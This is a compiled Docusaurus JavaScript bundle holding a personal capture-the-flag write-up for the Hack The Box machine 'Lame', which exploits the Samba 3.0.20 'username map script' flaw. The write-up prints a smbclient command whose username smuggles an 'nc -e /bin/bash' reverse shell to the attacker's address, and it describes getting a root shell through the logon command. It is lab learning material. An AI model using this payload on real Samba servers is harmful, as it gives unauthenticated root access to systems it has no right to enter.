"use strict";(self.webpackChunkmy_hack_notes=self.webpackChunkmy_hack_notes||[]).push([[232],{6738:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>o,toc:()=>r});var t=s(4848),i=s(8453);const a={sidebar_position:7},c=void 0,o={id:"Lame/samba exploit",title:"samba exploit",description:"From searchsploit",source:"@site/docs/Lame/samba exploit.md",sourceDirName:"Lame",slug:"/Lame/samba exploit",permalink:"/myHackNotes/Lame/samba exploit",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Lame/samba exploit.md",tags:[],version:"current",sidebarPosition:7,frontMatter:{sidebar_position:7},sidebar:"tutorialSidebar",previous:{title:"vsftpd exploit",permalink:"/myHackNotes/Lame/vsftpd exploit"}},l={},r=[{value:"From searchsploit",id:"from-searchsploit",level:3},{value:"Downloading the exploit",id:"downloading-the-exploit",level:3},{value:"Understanding what the exploit does",id:"understanding-what-the-exploit-does",level:3},{value:"Manual exploitation",id:"manual-exploitation",level:3},{value:"Exploit works (smbclient)",id:"exploit-works-smbclient",level:3},{value:"No shell at first try (smbclient)",id:"no-shell-at-first-try-smbclient",level:3},{value:"A shell using logon command (smbclient)",id:"a-shell-using-logon-command-smbclient",level:3},{value:"Getting a Full TTY",id:"getting-a-full-tty",level:3},{value:"Checking access to the flags",id:"checking-access-to-the-flags",level:3}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",em:"em",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h3,{id:"from-searchsploit",children:"From searchsploit"}),"\n",(0,t.jsx)(n.p,{children:"Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)"}),"\n",(0,t.jsx)(n.h3,{id:"downloading-the-exploit",children:"Downloading the exploit"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"searchsploit -m unix/remote/16320.rb\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(8771).A+"",width:"936",height:"216"})}),"\n",(0,t.jsx)(n.h3,{id:"understanding-what-the-exploit-does",children:"Understanding what the exploit does"}),"\n",(0,t.jsx)(n.p,{children:"From the script description:"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.em,{children:'This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary\r\ncommands.\r\nNo authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!'})}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"From source code:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(1912).A+"",width:"1070",height:"353"})}),"\n",(0,t.jsx)(n.h3,{id:"manual-exploitation",children:"Manual exploitation"}),"\n",(0,t.jsxs)(n.admonition,{title:"Useful link (HackTricks)",type:"info",children:[(0,t.jsx)(n.p,{children:"Manually enumerate windows shares and connect to them."}),(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#manually-enumerate-windows-shares-and-connect-to-them",children:"https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#manually-enumerate-windows-shares-and-connect-to-them"})}),"\n"]})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"smbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> \n"})}),"\n",(0,t.jsx)(n.h3,{id:"exploit-works-smbclient",children:"Exploit works (smbclient)"}),"\n",(0,t.jsx)(n.p,{children:"Using the exploit to send a ping to my machine as payload I can see how I receive the packet using tcpdump."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(2129).A+"",width:"965",height:"328"})}),"\n",(0,t.jsx)(n.h3,{id:"no-shell-at-first-try-smbclient",children:"No shell at first try (smbclient)"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:'smbclient -U "/=`nc -e /bin/bash 10.10.14.20 444`" \\\\\\\\lame.htb\\\\tmp\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(9038).A+"",width:"919",height:"302"})}),"\n",(0,t.jsxs)(n.p,{children:["As ",(0,t.jsx)(n.strong,{children:"0xdf"})," explained on his writeup I get a shell but I'm still in my local machine."]}),"\n",(0,t.jsx)(n.p,{children:"This happens because the payload:"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"nc -e /bin/bash 10.10.14.20 4444"})," is being executed before smbclient tries to connect."]}),"\n",(0,t.jsx)(n.p,{children:"We can reach this conclusion after identifying that the we're connected to the local one and not the target machine. smbclient asks for a password after sending the username, and that doesn't happen till we close the netcat session."}),"\n",(0,t.jsxs)(n.p,{children:["Again, ",(0,t.jsx)(n.strong,{children:"0xdf"})," also tells us that we can try replacing ",(0,t.jsx)(n.code,{children:'"'})," by ",(0,t.jsx)(n.code,{children:"'"})," to try avoid that behavior, but for some reason it capitalizes the beginning of the command so it's not going to work."]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(1527).A+"",width:"752",height:"75"})}),"\n",(0,t.jsx)(n.h3,{id:"a-shell-using-logon-command-smbclient",children:"A shell using logon command (smbclient)"}),"\n",(0,t.jsx)(n.p,{children:"After connecting with a NULL session"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"smbclient -N \\\\\\\\lame.htb\\\\tmp\n"})}),"\n",(0,t.jsxs)(n.p,{children:["We can list all the commands available and exploit the vulnerability sending the payload through ",(0,t.jsx)(n.strong,{children:"logon"})," command"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(8876).A+"",width:"771",height:"578"})}),"\n",(0,t.jsxs)(n.p,{children:["After that we get a shell as ",(0,t.jsx)(n.strong,{children:"root"})," on our listening port."]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(4789).A+"",width:"812",height:"459"})}),"\n",(0,t.jsx)(n.h3,{id:"getting-a-full-tty",children:"Getting a Full TTY"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"script /dev/null -qc /bin/bash\r\n# ctrl + z\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"stty raw -echo;fg\r\nreset xterm\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"export TERM=xterm\r\nexport SHELL=/bin/bash\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(3938).A+"",width:"393",height:"144"})}),"\n",(0,t.jsx)(n.p,{children:"TTY has not the right size"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(8763).A+"",width:"1238",height:"704"})}),"\n",(0,t.jsx)(n.p,{children:"Let's check the size in our local machine"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"\u276f stty size\r\n31 120\n"})}),"\n",(0,t.jsx)(n.p,{children:"Let's configure same size on the target machine"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"root@lame:/# stty rows 31 columns 120\r\nroot@lame:/# nano\n"})}),"\n",(0,t.jsx)(n.p,{children:"Now nano size looks OK:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:s(4507).A+"",width:"1238",height:"696"})}),"\n",(0,t.jsx)(n.h3,{id:"checking-access-to-the-flags",children:"Checking access to the flags"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-jsx",children:"root@lame:/# find /home -name user.txt -exec wc -c {} \\;\r\n33 /home/makis/user.txt\r\nroot@lame:/# find /root -name root.txt -exec wc -c {} \\;\r\n33 /root/root.txt\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8771:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-011-3f79159f38a4292d21e1e0e205e3b188.png"},1912:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-012-2b26a5c181002072bfeda591fc1420f5.png"},2129:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-013-0be9d61c56335ba97bf05031c61b522a.png"},9038:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-014-f8252bde78a7ec31c2b45774faef27cd.png"},1527:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-015-d4c25b1efec909059d9a977426a4a5d3.png"},8876:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-016-ed27c92c54dc923741263034c4f3c86f.png"},4789:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-017-04beb56ec818a8017abea560cafc8ce0.png"},3938:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-018-9f32bec93a252d2adfeeab933a201f0d.png"},8763:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-019-ef62f7b101b6d10b38274cfc1e72611f.png"},4507:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/lame-020-e4e04ea44b7645b631acb1169da33486.png"},8453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>o});var t=s(6540);const i={},a=t.createContext(i);function c(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);